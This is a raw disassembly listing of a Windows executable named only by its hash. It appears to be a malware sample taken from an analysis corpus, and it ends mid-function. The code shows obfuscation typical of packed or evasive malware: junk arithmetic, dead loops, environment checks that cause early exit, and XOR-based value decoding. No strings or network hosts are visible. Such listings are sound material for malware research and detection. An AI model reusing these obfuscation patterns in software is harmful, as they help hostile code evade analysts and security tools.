
f3a193de691e671fbf0016a528b389e665949095aa4dd16d136ae80e1139d606.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
